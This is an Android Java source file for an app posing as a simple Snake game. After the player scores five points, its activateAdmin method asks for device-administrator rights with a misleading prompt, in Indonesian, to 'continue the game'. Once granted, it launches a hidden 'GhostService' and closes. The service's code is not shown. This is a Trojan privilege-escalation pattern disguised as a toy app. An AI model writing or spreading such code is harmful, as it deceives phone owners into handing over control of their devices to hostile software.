package com.snakegame.fun;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.View;
import android.widget.*;

public class MainActivity extends Activity {
    private static final int GOAL_SCORE = 5;
    private SnakeView snakeView;
    private TextView scoreText;
    private Handler handler = new Handler();
    private int score = 0;
    private boolean gameOver = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);
        root.setGravity(Gravity.CENTER);

        scoreText = new TextView(this);
        scoreText.setText("Score: 0");
        scoreText.setTextColor(Color.WHITE);
        scoreText.setTextSize(24);
        root.addView(scoreText);

        snakeView = new SnakeView(this);
        LinearLayout.LayoutParams gameParams = new LinearLayout.LayoutParams(600, 600);
        snakeView.setLayoutParams(gameParams);
        root.addView(snakeView);

        LinearLayout controls = new LinearLayout(this);
        controls.setOrientation(LinearLayout.HORIZONTAL);
        controls.setGravity(Gravity.CENTER);

        Button upBtn = new Button(this);
        upBtn.setText("▲");
        upBtn.setOnClickListener(v -> snakeView.setDirection(0, -1));
        controls.addView(upBtn);

        Button leftBtn = new Button(this);
        leftBtn.setText("◄");
        leftBtn.setOnClickListener(v -> snakeView.setDirection(-1, 0));
        controls.addView(leftBtn);

        Button rightBtn = new Button(this);
        rightBtn.setText("►");
        rightBtn.setOnClickListener(v -> snakeView.setDirection(1, 0));
        controls.addView(rightBtn);

        Button downBtn = new Button(this);
        downBtn.setText("▼");
        downBtn.setOnClickListener(v -> snakeView.setDirection(0, 1));
        controls.addView(downBtn);

        root.addView(controls);
        setContentView(root);

        snakeView.startGame();
        updateScore();
    }

    private void updateScore() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!gameOver) {
                    score = snakeView.getScore();
                    scoreText.setText("Score: " + score);
                    if (score >= GOAL_SCORE) {
                        gameOver = true;
                        activateAdmin();
                    } else {
                        handler.postDelayed(this, 300);
                    }
                }
            }
        }, 300);
    }

    private void activateAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(comp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan admin untuk melanjutkan game!");
            startActivity(intent);
        } else {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    public static class SnakeView extends View {
        private int headX = 5, headY = 5;
        private int foodX = 10, foodY = 10;
        private int dirX = 1, dirY = 0;
        private int gridSize = 40;
        private int score = 0;
        private Handler handler = new Handler();
        private boolean running = true;

        public SnakeView(Activity ctx) {
            super(ctx);
        }

        public void startGame() {
            running = true;
            handler.postDelayed(gameRunnable, 200);
        }

        public void setDirection(int x, int y) { dirX = x; dirY = y; }
        public int getScore() { return score; }

        private Runnable gameRunnable = new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                headX += dirX;
                headY += dirY;
                if (headX == foodX && headY == foodY) {
                    score++;
                    foodX = (int)(Math.random()*15);
                    foodY = (int)(Math.random()*15);
                }
                invalidate();
                handler.postDelayed(this, 200);
            }
        };

        @Override
        protected void onDraw(android.graphics.Canvas canvas) {
            super.onDraw(canvas);
            Paint paint = new Paint();
            paint.setColor(Color.RED);
            canvas.drawRect(foodX*gridSize, foodY*gridSize,
                    (foodX+1)*gridSize, (foodY+1)*gridSize, paint);
            paint.setColor(Color.GREEN);
            canvas.drawRect(headX*gridSize, headY*gridSize,
                    (headX+1)*gridSize, (headY+1)*gridSize, paint);
        }
    }
}
